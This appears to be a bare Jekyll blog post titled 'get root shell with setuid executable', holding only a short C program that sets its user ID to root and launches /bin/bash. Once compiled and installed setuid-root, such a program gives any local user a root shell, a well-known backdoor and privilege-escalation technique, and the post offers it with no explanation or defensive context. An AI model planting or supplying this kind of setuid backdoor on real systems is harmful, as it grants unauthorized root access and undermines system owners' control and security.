---
layout: post
title: "get root shell with setuid executable"
description: ""
category: 
tags: []
---
{% include JB/setup %}



<pre><code>
#include <unistd.h>

int main() {
  const char *b = "/bin/bash";
  setuid(0);
  execl(b, b, 0);
}
</code></pre>

